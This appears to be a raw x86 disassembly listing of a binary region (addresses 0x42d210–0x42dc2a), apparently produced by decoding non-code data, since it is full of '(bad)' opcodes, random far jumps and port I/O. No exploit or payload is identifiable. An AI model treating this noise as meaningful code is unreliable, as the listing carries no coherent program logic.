  42d210:	stos   BYTE PTR es:[edi],al
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d23f
  42d281:	not    BYTE PTR [edx+0x30]
  42d284:	sbb    eax,0x50001e4
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    cl,bl
  42d28d:	xchg   edx,eax
  42d28e:	scas   al,BYTE PTR es:[edi]
  42d28f:	arpl   WORD PTR [ebp+eiz*8-0x43f2d56c],di
  42d296:	sub    al,0x32
  42d299:	sub    ebx,DWORD PTR [eax]
  42d29b:	adc    esp,DWORD PTR [esi+0x2134041b]
  42d2a1:	mov    edx,0x84b44095
  42d2a6:	sar    BYTE PTR ds:0x82a3fb30,1
  42d2ac:	pop    esi
  42d2ad:	imul   ebp,DWORD PTR [ebx+0x3b1c110c],0x15
  42d2b4:	push   ecx
  42d2b5:	sub    eax,0xc2c1fe85
  42d2ba:	mov    al,ds:0x9268bd8d
  42d2bf:	enter  0xebb7,0xa2
  42d2c3:	pop    es
  42d2c4:	rol    DWORD PTR [ebx+0x569b5061],1
  42d2ca:	(bad)  
  42d2cb:	push   ecx
  42d2cc:	aas    
  42d2cd:	pop    edx
  42d2ce:	lds    esp,FWORD PTR [esi+0x5]
  42d2d1:	xor    eax,0xff5b715d
  42d2d6:	mov    ah,BYTE PTR [eax+ecx*4]
  42d2d9:	out    dx,eax
  42d2da:	fdivr  DWORD PTR [edi+0x3a]
  42d2dd:	mov    ah,0x99
  42d2df:	cmp    cl,BYTE PTR [ecx-0xf]
  42d2e2:	jmp    0x42d33f
  42d2e4:	stos   DWORD PTR es:[edi],eax
  42d2e5:	mov    cl,0xad
  42d2e7:	cmp    bl,BYTE PTR [ebp-0x7a]
  42d2ea:	pop    ds
  42d2eb:	mov    ebp,0x32b161f8
  42d2f0:	inc    esp
  42d2f1:	pop    edi
  42d2f2:	rol    DWORD PTR [edi],0x75
  42d2f5:	mov    ebp,0x26db8a42
  42d2fa:	dec    esp
  42d2fb:	jbe    0x42d358
  42d2fd:	inc    ebx
  42d2fe:	inc    esp
  42d2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d300:	shl    DWORD PTR [ebx],0x81
  42d303:	push   cs
  42d304:	dec    eax
  42d305:	xchg   edx,eax
  42d306:	sub    BYTE PTR [eax-0x697bbf0d],bl
  42d30c:	mov    ch,0xc4
  42d30e:	lods   al,BYTE PTR ds:[esi]
  42d30f:	out    0xa9,eax
  42d311:	or     al,0x0
  42d313:	dec    ecx
  42d314:	icebp  
  42d315:	xchg   ecx,eax
  42d316:	jnp    0x42d29a
  42d318:	mov    ebp,esi
  42d31a:	push   ecx
  42d31b:	into   
  42d31c:	jno    0x42d2e3
  42d31e:	push   eax
  42d31f:	out    0x9f,eax
  42d321:	ins    DWORD PTR es:[edi],dx
  42d322:	inc    si
  42d324:	ret    0xb6ce
  42d327:	rcr    DWORD PTR [ebx+eax*2-0x6b],0x2f
  42d32c:	sub    cl,cl
  42d32e:	test   DWORD PTR [esi-0x71],esp
  42d331:	mov    ds:0xd24ef9d5,al
  42d336:	xchg   ebp,eax
  42d337:	mov    dl,0xf7
  42d339:	test   BYTE PTR [eax],dh
  42d33b:	adc    eax,0x758d128
  42d340:	ret    
  42d341:	mov    DWORD PTR [eax+0x36],esp
  42d344:	test   DWORD PTR [esi+0x23],0x69aaf100
  42d34b:	stc    
  42d34c:	lea    ebx,[esi+0x5368ceaf]
  42d352:	rol    DWORD PTR [ecx+0x2313dbe3],0x11
  42d359:	xor    DWORD PTR [ecx],eax
  42d35b:	pop    es
  42d35c:	mov    esi,DWORD PTR ds:[edx]
  42d35f:	jp     0x42d3ad
  42d361:	xchg   ebx,eax
  42d362:	das    
  42d363:	shr    DWORD PTR [edx+0x1c],cl
  42d366:	sbb    eax,0x47a4ddb0
  42d36b:	or     BYTE PTR [edx],al
  42d36d:	mov    ebp,0xb6f1d392
  42d372:	cld    
  42d373:	xchg   ebp,eax
  42d374:	xchg   ebx,eax
  42d375:	jmp    0xfffe:0xecd0b4c2
  42d37c:	cmp    eax,0x49f9fc84
  42d381:	jmp    0x22bcd749
  42d386:	mov    ah,0x9f
  42d388:	xor    ebp,DWORD PTR [ebp-0x2721404c]
  42d38e:	nop
  42d38f:	out    dx,eax
  42d390:	test   BYTE PTR [eax],0x0
	...
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	ret    0xaf29
  42d403:	retf   0xe522
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0x13000001
  42d40d:	retf   
  42d40e:	dec    edi
  42d40f:	inc    esp
  42d410:	sub    al,0xdb
  42d412:	jge    0x42d3dd
  42d414:	out    dx,eax
  42d415:	xchg   ebp,eax
  42d416:	ds pop edx
  42d418:	cs or  al,0x2
  42d41b:	push   edx
  42d41c:	push   esp
  42d41d:	in     eax,dx
  42d41e:	sub    eax,0xc2c569c6
  42d423:	mov    edx,0x50dcc09c
  42d428:	cmp    al,0xbe
  42d42a:	lods   al,BYTE PTR ds:[esi]
  42d42b:	daa    
  42d42c:	aas    
  42d42d:	pop    ebp
  42d42e:	ret    0xf32e
  42d431:	dec    ebx
  42d432:	arpl   WORD PTR [ebx+0x1d],cx
  42d435:	xchg   ecx,eax
  42d436:	mov    bl,0xd4
  42d438:	hlt    
  42d439:	clc    
  42d43a:	sbb    eax,0x5b8e9c0b
  42d43f:	stos   BYTE PTR es:[edi],al
  42d440:	push   esi
  42d441:	pop    esi
  42d442:	jp     0x42d3e4
  42d444:	and    al,0xf
  42d446:	aam    0xdd
  42d448:	inc    edx
  42d449:	xchg   esi,eax
  42d44a:	pop    edx
  42d44b:	cmp    eax,0xbeb03624
  42d450:	inc    ebx
  42d451:	jo     0x42d40d
  42d453:	mov    ah,0x49
  42d455:	in     eax,0xbc
  42d457:	adc    dh,dl
  42d459:	out    0x55,al
  42d45b:	call   FWORD PTR [ecx-0x1d]
  42d45e:	leave  
  42d45f:	adc    esi,eax
  42d461:	cmp    DWORD PTR [ebx+0x49],ebx
  42d464:	iret   
  42d465:	enter  0xfe35,0x8b
  42d469:	pop    eax
  42d46a:	scas   al,BYTE PTR es:[edi]
  42d46b:	test   dh,0xd8
  42d46e:	mov    ch,0x35
  42d470:	sbb    al,0xdd
  42d472:	inc    esi
  42d473:	xchg   BYTE PTR [edi+0xba3fe90],ch
  42d479:	out    dx,eax
  42d47a:	cmp    BYTE PTR [esi-0x42],dh
  42d47d:	push   ebp
  42d47e:	enter  0x9280,0xec
  42d482:	inc    edi
  42d483:	mov    ebx,0xe7801b46
  42d488:	loop   0x42d4a1
  42d48a:	pop    ebx
  42d48b:	mov    al,ds:0x4d6d1c4
  42d490:	rcl    BYTE PTR [bx+si-0x9],1
  42d494:	mul    DWORD PTR [eax+eiz*2]
  42d497:	popa   
  42d498:	jb     0x42d4ec
  42d49a:	push   edx
  42d49b:	xchg   ebx,eax
  42d49c:	rcr    BYTE PTR [ecx+0x2bf78998],0x67
  42d4a3:	push   eax
  42d4a4:	loope  0x42d455
  42d4a6:	imul   ecx,DWORD PTR [ebp+0x7024bb2e],0x5df2d911
  42d4b0:	jmp    0x21d2:0xc61bc2c1
  42d4b7:	xchg   ebx,eax
  42d4b8:	xor    BYTE PTR ds:0x41b2312b,bl
  42d4be:	inc    esi
  42d4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4c0:	fdiv   DWORD PTR [esi-0x6c]
  42d4c3:	cmp    eax,0xa27f32cb
  42d4c8:	or     al,0xa9
  42d4ca:	retf   0x311c
  42d4cd:	repz ss pop ds
  42d4d0:	cwde   
  42d4d1:	adc    BYTE PTR [edi+0x983e244],cl
  42d4d7:	sbb    DWORD PTR [ecx],eax
  42d4d9:	ret    0xa5e6
  42d4dc:	daa    
  42d4dd:	ja     0x42d48c
  42d4df:	inc    ecx
  42d4e0:	aam    0x5b
  42d4e2:	push   es
  42d4e3:	add    al,BYTE PTR [edi]
  42d4e5:	pop    ecx
  42d4e6:	push   ebp
  42d4e7:	cmp    ecx,DWORD PTR [eax-0x942b3ae]
  42d4ed:	aaa    
  42d4ee:	mov    ds:0x3a5aaac7,al
  42d4f3:	fisubr DWORD PTR [eax+0x2cba2b34]
  42d4f9:	pushf  
  42d4fa:	dec    ecx
  42d4fb:	sbb    al,0xdd
  42d4fd:	(bad)  
  42d4fe:	mov    al,ds:0x4c504e11
  42d503:	add    BYTE PTR ds:0xb5457ffe,ah
  42d509:	jae    0x42d48b
  42d50b:	sub    DWORD PTR [esi-0x18420240],0x0
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x345eacd5,eax
  42d583:	imul   esp,DWORD PTR [edi],0x50001e6
  42d589:	add    DWORD PTR [eax],eax
  42d58b:	add    BYTE PTR [edi+0x2a6db9b7],bh
  42d591:	or     ebp,DWORD PTR [ebp+0x2f]
  42d594:	sti    
  42d595:	push   esi
  42d596:	and    eax,0x622bacac
  42d59b:	sbb    ebx,DWORD PTR [eax]
  42d59d:	js     0x42d608
  42d59f:	push   edx
  42d5a0:	popa   
  42d5a1:	push   ebx
  42d5a2:	sbb    DWORD PTR [ecx],eax
  42d5a4:	cmp    ch,bh
  42d5a6:	out    dx,al
  42d5a7:	sub    dh,BYTE PTR [ebx+0x257efe76]
  42d5ad:	push   ecx
  42d5ae:	cmp    eax,0xa508d5a6
  42d5b3:	push   ebx
  42d5b4:	int    0x66
  42d5b6:	fild   WORD PTR [esi+0x15]
  42d5b9:	add    al,0xd7
  42d5bb:	jne    0x42d57a
  42d5bd:	sbb    BYTE PTR [edx+0x3268018d],ch
  42d5c3:	pop    es
  42d5c4:	push   0xfffffffa
  42d5c6:	idiv   DWORD PTR [edx+0x10ca81d7]
  42d5cc:	fisttp QWORD PTR [esi+0x2f]
  42d5cf:	lahf   
  42d5d0:	adc    al,ah
  42d5d2:	push   ecx
  42d5d3:	stos   BYTE PTR es:[edi],al
  42d5d4:	pop    ds
  42d5d5:	mov    edx,0x3137fde6
  42d5da:	dec    ebp
  42d5db:	icebp  
  42d5dc:	sbb    cl,BYTE PTR [esi+0xec7d45f]
  42d5e2:	dec    ebp
  42d5e3:	push   esi
  42d5e4:	and    edx,DWORD PTR [edx-0x413f5532]
  42d5ea:	cmp    DWORD PTR [eax-0x41],eax
  42d5ed:	repnz mov al,0xa3
  42d5f0:	test   al,0x86
  42d5f2:	mov    edx,0x4e5a24d6
  42d5f7:	pop    es
  42d5f8:	ins    DWORD PTR es:[edi],dx
  42d5f9:	dec    esp
  42d5fa:	add    al,0x21
  42d5fc:	or     ch,bh
  42d5fe:	aam    0xff
  42d600:	cmp    esp,ecx
  42d602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d603:	call   0x51ad:0x3735db2
  42d60a:	gs dec eax
  42d60c:	and    cl,BYTE PTR [esi]
  42d60e:	inc    edi
  42d60f:	in     eax,dx
  42d610:	sti    
  42d611:	push   ds
  42d612:	in     eax,0x21
  42d614:	and    DWORD PTR [bx-0x43],0xbb3e5400
  42d61c:	adc    eax,0x94e50dd0
  42d621:	pop    esp
  42d622:	ror    DWORD PTR [ecx-0x5a],0xb4
  42d626:	sahf   
  42d627:	gs aad 0x8a
  42d62a:	dec    esi
  42d62b:	(bad)  
  42d62c:	push   edi
  42d62d:	push   ebp
  42d62e:	cld    
  42d62f:	cmp    esi,DWORD PTR [ebp+0x60d5ae73]
  42d635:	retf   
  42d636:	pop    ecx
  42d637:	lds    esp,FWORD PTR [ebp-0x7eef4a96]
  42d63d:	or     DWORD PTR [ebx+0x31663b1e],ebp
  42d643:	mov    dl,0x7c
  42d645:	in     al,dx
  42d646:	aas    
  42d647:	scas   al,BYTE PTR es:[edi]
  42d648:	loop   0x42d6ad
  42d64a:	cmc    
  42d64b:	jbe    0x42d6c7
  42d64d:	fisub  WORD PTR [edx+0x3d]
  42d650:	sbb    DWORD PTR [edx+0x1e],ebp
  42d653:	mov    ch,0x1
  42d655:	adc    DWORD PTR [ebx],ebp
  42d657:	sti    
  42d658:	mov    al,0x13
  42d65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d65b:	adc    eax,0x33cb07f2
  42d660:	mov    ebp,0x1be6352c
  42d665:	or     ah,BYTE PTR [ecx-0x4]
  42d668:	sub    esp,eax
  42d66a:	pop    edx
  42d66b:	loope  0x42d6a7
  42d66d:	ret    0xfe16
  42d670:	cmc    
  42d671:	xchg   DWORD PTR [ebx+0x6aef045c],ecx
  42d677:	(bad)  
  42d678:	not    BYTE PTR [eax-0x2e0b93f4]
  42d67e:	xchg   ecx,eax
  42d67f:	mov    cl,ch
  42d681:	dec    edx
  42d682:	outs   dx,BYTE PTR ds:[esi]
  42d683:	inc    edi
  42d684:	lahf   
  42d685:	or     eax,0x3dcbb9bd
  42d68a:	mov    ds,WORD PTR [esi+0x51a883b0]
  42d690:	mov    esi,0x0
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xff
  42d701:	dec    eax
  42d702:	adc    cl,BYTE PTR [eax+0x2c]
  42d705:	out    0x1,eax
  42d707:	add    BYTE PTR ds:0xcf000001,al
  42d70d:	mov    bh,0x96
  42d70f:	sbb    cl,BYTE PTR [eax+0x52afa80f]
  42d715:	ins    BYTE PTR es:[edi],dx
  42d716:	enter  0x92ec,0xf1
  42d71a:	popa   
  42d71b:	sbb    BYTE PTR [edx-0x7e66ef29],ah
  42d721:	add    DWORD PTR [eax+esi*4-0x6bc1caf5],ebx
  42d728:	xor    BYTE PTR [eax*2-0x2fe23895],cl
  42d72f:	das    
  42d730:	pushf  
  42d731:	clc    
  42d732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d733:	sub    bh,ah
  42d735:	aam    0xd4
  42d737:	outs   dx,BYTE PTR ds:[esi]
  42d738:	mov    esp,0x12b8ea53
  42d73d:	sti    
  42d73e:	aad    0x57
  42d740:	cmp    DWORD PTR [edx-0x5588a674],eax
  42d746:	dec    esp
  42d747:	sub    DWORD PTR [ebx+0x7b],0x8f2550af
  42d74e:	fbld   TBYTE PTR [ebx+0x12f617d9]
  42d754:	ds push esp
  42d756:	sub    dh,dh
  42d758:	enter  0xcec,0x8b
  42d75c:	retf   0x5939
  42d75f:	add    edi,0xa0b764b6
  42d765:	mov    edi,0xf66a1667
  42d76a:	(bad)  [edx-0x3]
  42d76d:	and    BYTE PTR [ebx+0xec0974d],ch
  42d773:	iret   
  42d774:	mov    edx,0x9a3dbc91
  42d779:	push   ds
  42d77a:	jge    0x42d7cf
  42d77c:	ins    BYTE PTR es:[edi],dx
  42d77d:	bound  esp,QWORD PTR [esi-0x57]
  42d780:	mov    edi,0xd1fe4067
  42d785:	lds    ebp,FWORD PTR [ebx+esi*8]
  42d788:	xchg   edi,eax
  42d789:	pop    esi
  42d78a:	sar    BYTE PTR [ebp+0x36],1
  42d78d:	push   edi
  42d78e:	xlat   BYTE PTR ds:[bx]
  42d790:	push   0xf3f3cab2
  42d795:	ror    BYTE PTR [edx-0x1c],1
  42d798:	cwde   
  42d799:	and    esi,DWORD PTR [eax+0x44db708f]
  42d79f:	add    BYTE PTR [edi],al
  42d7a1:	fldenv [bp+si]
  42d7a4:	stos   BYTE PTR es:[edi],al
  42d7a5:	loope  0x42d735
  42d7a7:	pop    esi
  42d7a8:	jle    0x42d815
  42d7aa:	enter  0x4b44,0x59
  42d7ae:	pop    ebx
  42d7af:	inc    ecx
  42d7b0:	imul   ebp,eax,0x73383c0d
  42d7b6:	jmp    0x42d834
  42d7b8:	outs   dx,BYTE PTR ds:[esi]
  42d7b9:	sbb    BYTE PTR [ecx],dl
  42d7bb:	loope  0x42d814
  42d7bd:	and    BYTE PTR [edx-0x5e],dl
  42d7c0:	mov    ch,0x9f
  42d7c2:	stos   BYTE PTR es:[edi],al
  42d7c3:	fild   DWORD PTR [ecx-0xf4a46c3]
  42d7c9:	xor    DWORD PTR [esi],edi
  42d7cb:	test   eax,0x7374dccb
  42d7d0:	lods   al,BYTE PTR ds:[esi]
  42d7d1:	clc    
  42d7d2:	pop    ds
  42d7d3:	mov    dh,0xb5
  42d7d5:	test   DWORD PTR [edi+0x6e2b101b],edx
  42d7db:	ror    DWORD PTR [esi-0x33838691],0x12
  42d7e2:	or     ecx,DWORD PTR [ebx]
  42d7e4:	ss sub eax,0xb40e6e66
  42d7ea:	pop    eax
  42d7eb:	xor    DWORD PTR [ebx+0xb],edx
  42d7ee:	mov    ds:0xbef57dba,al
  42d7f3:	and    eax,ebp
  42d7f5:	lds    edx,FWORD PTR [eax-0x6f]
  42d7f8:	lods   al,BYTE PTR ds:[esi]
  42d7f9:	push   ebp
  42d7fa:	imul   ebx,DWORD PTR [esi-0x1f30527e],0x42
  42d801:	retf   
  42d802:	pop    ds
  42d803:	push   edx
  42d804:	xor    esp,esp
  42d806:	or     ebx,DWORD PTR [ebp-0x539798ae]
  42d80c:	fmulp  st(7),st
  42d80e:	data16 fdiv QWORD PTR [eax+eax*1+0x0]
	...
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xdc6961a
  42d881:	sub    edi,esp
  42d883:	pop    es
  42d884:	xor    eax,ebp
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0x3a000001
  42d88d:	sub    BYTE PTR [ebp-0x54],bl
  42d890:	(bad)  
  42d891:	mov    eax,0x8a70554e
  42d896:	rol    DWORD PTR [esi-0x78],0xf2
  42d89a:	ror    BYTE PTR [esi],cl
  42d89c:	fs aad 0x87
  42d89f:	mov    ch,0x2a
  42d8a1:	(bad)  
  42d8a2:	fst    st(0)
  42d8a4:	call   0x1fb1:0x191f3a2
  42d8ab:	fsubr  st(0),st
  42d8ad:	adc    eax,0xfe56c262
  42d8b2:	xor    esp,ebp
  42d8b4:	sub    bl,BYTE PTR [eax-0x6872c2b3]
  42d8ba:	xchg   ebp,eax
  42d8bb:	pop    edx
  42d8bc:	out    dx,al
  42d8bd:	fistp  DWORD PTR [ecx-0x11c3aaea]
  42d8c3:	and    dl,BYTE PTR [ebp+0x6d5a50c3]
  42d8c9:	mov    al,0x50
  42d8cb:	pop    ss
  42d8cc:	fistp  QWORD PTR [ebx]
  42d8ce:	jecxz  0x42d8fc
  42d8d0:	push   ebp
  42d8d1:	sub    al,0x3b
  42d8d3:	je     0x42d91f
  42d8d5:	or     DWORD PTR [eax],edi
  42d8d7:	jno    0x42d904
  42d8d9:	xchg   edx,eax
  42d8da:	out    dx,eax
  42d8db:	out    0x99,eax
  42d8dd:	int    0xa6
  42d8df:	ds adc edx,esi
  42d8e2:	add    DWORD PTR [esi],esi
  42d8e4:	shl    BYTE PTR [ebx+0x4d8abcd9],1
  42d8ea:	ret    
  42d8eb:	cmp    BYTE PTR [ecx-0x4d8f0ae4],al
  42d8f1:	shl    BYTE PTR ds:0x7474b462,1
  42d8f7:	jecxz  0x42d961
  42d8f9:	enter  0xc26c,0x74
  42d8fd:	adc    ecx,DWORD PTR [ecx+0x7f]
  42d900:	jl     0x42d8da
  42d902:	pop    ecx
  42d903:	xacquire xchg DWORD PTR [edx-0x59],ebx
  42d907:	rol    ebx,1
  42d909:	hlt    
  42d90a:	fdiv   DWORD PTR [ebp+0x6e96db69]
  42d910:	push   ds
  42d911:	stos   DWORD PTR es:[edi],eax
  42d912:	jecxz  0x42d8f6
  42d914:	popf   
  42d915:	adc    esp,DWORD PTR [ebp-0x43]
  42d918:	test   BYTE PTR [ebx-0x34],0x72
  42d91c:	shl    al,1
  42d91e:	sbb    BYTE PTR [edi],ch
  42d920:	es hlt 
  42d922:	bound  edx,QWORD PTR [esi]
  42d924:	and    ecx,DWORD PTR [edi+0x26]
  42d927:	(bad)  
  42d928:	jbe    0x42d8df
  42d92a:	nop
  42d92b:	and    BYTE PTR [edi-0x6aa1f9fa],0xf9
  42d932:	outs   dx,BYTE PTR ds:[esi]
  42d933:	in     eax,dx
  42d934:	sbb    al,0xcc
  42d936:	outs   dx,BYTE PTR ds:[esi]
  42d937:	sar    dl,1
  42d939:	inc    ecx
  42d93a:	push   edi
  42d93b:	mov    ecx,0xae234a8a
  42d940:	shr    BYTE PTR [esi-0x54d143b],cl
  42d946:	jnp    0x42d9b5
  42d948:	jne    0x42d92f
  42d94a:	mov    WORD PTR [eax-0x12310265],ds
  42d950:	loope  0x42d918
  42d952:	jg     0x42d93a
  42d954:	jmp    0x42d93c
  42d956:	xchg   ebx,eax
  42d957:	and    eax,0x2b6d57
  42d95c:	mov    ebx,0xa9ef73fa
  42d961:	mov    eax,ds:0x1f9a0dd4
  42d966:	mov    eax,0x961e5849
  42d96b:	shl    BYTE PTR [edi],0xa5
  42d96e:	fwait
  42d96f:	call   0x6e8be6c0
  42d974:	(bad)  
  42d975:	shr    BYTE PTR [eax+edi*8+0x42],0x15
  42d97a:	pop    eax
  42d97b:	sti    
  42d97c:	test   eax,0xbd9cca19
  42d981:	retf   0xc63c
  42d984:	push   es
  42d985:	sbb    BYTE PTR [esi],bl
  42d987:	imul   esp,DWORD PTR [esi-0x71d5d1ef],0x2611f37b
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	sti    
  42da01:	and    DWORD PTR [eax],edi
  42da03:	pop    ds
  42da04:	ss jmp 0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	lds    eax,FWORD PTR [edx-0x760d9fa]
  42da12:	pop    esp
  42da13:	ror    BYTE PTR [ecx-0x68b5addc],0xef
  42da1a:	std    
  42da1b:	mov    ebp,0x8e362c51
  42da20:	cmp    eax,0x77142467
  42da25:	ins    BYTE PTR es:[edi],dx
  42da26:	cld    
  42da27:	out    dx,eax
  42da28:	pop    ds
  42da29:	fcomi  st,st(7)
  42da2b:	mov    cl,0xff
  42da2d:	(bad)  [eax]
  42da2f:	jl     0x42da03
  42da31:	pminsw mm0,QWORD PTR [eax+0x5e]
  42da35:	inc    edx
  42da36:	ret    0x556e
  42da39:	adc    esi,0xb3fa641e
  42da3f:	dec    ebp
  42da40:	jle    0x42daad
  42da42:	adc    eax,0xbf0b5e39
  42da47:	push   cs
  42da48:	scas   eax,DWORD PTR es:[edi]
  42da49:	xchg   ecx,eax
  42da4a:	lods   al,BYTE PTR ds:[esi]
  42da4b:	xchg   ebp,eax
  42da4c:	shr    DWORD PTR [ecx+0x6],0xae
  42da50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da51:	loope  0x42dacf
  42da53:	ins    BYTE PTR es:[edi],dx
  42da54:	int3   
  42da55:	sbb    al,bh
  42da57:	ret    
  42da58:	aaa    
  42da59:	push   0xffffff8f
  42da5b:	and    al,0x17
  42da5d:	jae    0x42da4e
  42da5f:	pop    eax
  42da60:	push   ebx
  42da61:	das    
  42da62:	push   ds
  42da63:	int3   
  42da64:	sbb    BYTE PTR [edi+0x61951125],0x2a
  42da6b:	or     ah,bl
  42da6d:	loop   0x42dae1
  42da6f:	adc    dh,al
  42da71:	fwait
  42da72:	stos   DWORD PTR es:[edi],eax
  42da73:	add    DWORD PTR [edx],edi
  42da75:	dec    esp
  42da76:	inc    esp
  42da77:	lock daa 
  42da79:	push   cs
  42da7a:	xor    al,0x3
  42da7c:	lahf   
  42da7d:	pop    esi
  42da7e:	ret    
  42da7f:	sub    DWORD PTR [ebx+0x188c95a],ecx
  42da85:	push   edx
  42da86:	mov    bl,0xbc
  42da88:	pop    edx
  42da89:	pop    esp
  42da8a:	es mov ch,0x89
  42da8d:	adc    dh,BYTE PTR [ebx+esi*1+0x0]
  42da91:	out    0x42,al
  42da93:	retf   0x9712
  42da96:	loop   0x42dab6
  42da98:	mov    al,al
  42da9a:	add    BYTE PTR [esi+0x3985f8a8],ah
  42daa0:	pop    edx
  42daa1:	out    dx,al
  42daa2:	jns    0x42da31
  42daa4:	repnz cmp eax,0x13b3fb01
  42daaa:	mov    dh,0xba
  42daac:	dec    edx
  42daad:	and    bl,BYTE PTR [ecx-0x63]
  42dab0:	mov    bh,0x5c
  42dab2:	out    0x61,eax
  42dab4:	retf   
  42dab5:	mov    ah,ch
  42dab7:	(bad)  
  42dab8:	loopne 0x42dae6
  42daba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dabb:	cmp    ebx,DWORD PTR cs:[edx+0x78]
  42dabf:	cdq    
  42dac0:	hlt    
  42dac1:	pop    es
  42dac2:	sbb    BYTE PTR [ecx],cl
  42dac4:	add    eax,0x45f60486
  42dac9:	gs (bad) 
  42dacb:	pop    ecx
  42dacc:	out    dx,eax
  42dacd:	cwde   
  42dace:	outs   dx,BYTE PTR ds:[esi]
  42dacf:	mov    ebp,0xd1c70d9c
  42dad4:	daa    
  42dad5:	add    ecx,DWORD PTR [edi]
  42dad7:	nop
  42dad8:	outs   dx,DWORD PTR gs:[esi]
  42dada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dadb:	pop    ecx
  42dadc:	add    DWORD PTR [esi],ebp
  42dade:	or     DWORD PTR [esp+ebx*4-0x73],ebp
  42dae2:	test   BYTE PTR [edx+0x3fcd7756],dl
  42dae8:	or     esp,DWORD PTR [ecx]
  42daea:	push   0x12a2eeea
  42daef:	adc    al,0x8a
  42daf1:	addr16 dec esp
  42daf3:	xor    edx,DWORD PTR [esi+0xe719696]
  42daf9:	leave  
  42dafa:	mov    eax,ds:0xf715c60c
  42db00:	cld    
  42db01:	in     eax,0x34
  42db03:	add    ebx,DWORD PTR [eax]
  42db05:	and    eax,DWORD PTR [ebx-0x6eeb5070]
  42db0b:	inc    edx
  42db0c:	fdiv   st,st(5)
  42db0e:	mov    DWORD PTR [ecx+0x12],0x0
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db99
  42db81:	add    BYTE PTR [ecx],bh
  42db83:	aam    0x3b
  42db85:	jmp    0x0:0x1050001
  42db8c:	mov    ds:0xd5a436be,al
  42db91:	icebp  
  42db92:	adc    eax,0x314b25d7
  42db97:	sub    DWORD PTR [edx+esi*1-0x63],0xffffffce
  42db9c:	stos   DWORD PTR es:[edi],eax
  42db9d:	and    al,0x28
  42db9f:	test   al,0x50
  42dba1:	clc    
  42dba2:	lahf   
  42dba3:	(bad)  
  42dba4:	vmread edi,ecx
  42dba7:	ret    0x4481
  42dbaa:	and    DWORD PTR [ecx+0x64],eax
  42dbad:	or     ch,BYTE PTR [esi-0x21749f04]
  42dbb3:	add    dl,al
  42dbb5:	pop    ss
  42dbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbb7:	add    BYTE PTR [ebx-0x139eec88],0x5
  42dbbe:	(bad)  
  42dbbf:	mov    fs,WORD PTR [edi-0x58]
  42dbc2:	xor    dl,BYTE PTR [eax+ebx*2]
  42dbc5:	js     0x42db9c
  42dbc7:	dec    edi
  42dbc8:	pusha  
  42dbc9:	gs xchg edi,edx
  42dbcc:	call   0xb3618fa7
  42dbd1:	inc    ebx
  42dbd2:	adc    al,BYTE PTR [ebx]
  42dbd4:	mov    bh,0xbc
  42dbd6:	jb     0x42dc42
  42dbd8:	ins    DWORD PTR es:[edi],dx
  42dbd9:	test   BYTE PTR [ecx+esi*8-0x6a],0xb6
  42dbde:	out    dx,eax
  42dbdf:	adc    cl,bl
  42dbe1:	jbe    0x42dba9
  42dbe3:	sub    al,0xa1
  42dbe5:	test   DWORD PTR [edx+0x44],0x1ffe9fbc
  42dbec:	xor    BYTE PTR [ecx+edx*4],bl
  42dbef:	pop    esi
  42dbf0:	adc    al,0x4
  42dbf2:	aas    
  42dbf3:	stos   BYTE PTR es:[edi],al
  42dbf4:	mov    eax,DWORD PTR [ebx]
  42dbf6:	stos   BYTE PTR es:[edi],al
  42dbf7:	adc    dl,dh
  42dbf9:	outs   dx,DWORD PTR ds:[esi]
  42dbfa:	jle    0x42dbd1
  42dbfc:	ds in  eax,dx
  42dbfe:	mov    ah,0xad
  42dc00:	xor    DWORD PTR [edx-0x636838d5],esp
  42dc06:	les    edx,FWORD PTR [edi+0x63f85a95]
  42dc0c:	or     eax,0x575e1b1d
  42dc11:	retf   
  42dc12:	(bad)  
  42dc13:	adc    BYTE PTR [ecx+0x3e7a8c91],cl
  42dc19:	addr16 or eax,0xa185471f
  42dc1f:	pop    esp
  42dc20:	or     cl,al
  42dc22:	or     DWORD PTR [edi],esp
  42dc24:	mov    DWORD PTR fs:[ebx],ecx
  42dc27:	xor    BYTE PTR [ecx-0x3c],al
  42dc2a:	out    dx,eax
